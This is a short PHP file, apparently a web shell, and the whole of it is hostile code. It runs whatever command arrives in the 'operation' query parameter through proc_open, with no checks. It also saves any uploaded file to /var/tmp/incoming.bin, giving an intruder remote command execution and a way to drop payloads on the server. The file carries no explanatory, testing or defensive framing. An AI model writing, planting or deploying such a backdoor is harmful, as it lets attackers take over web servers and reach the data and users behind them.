<?php
$command = $_GET['operation'];
$process = proc_open($command, [], $pipes);
move_uploaded_file($_FILES['f']['tmp_name'], '/var/tmp/incoming.bin');
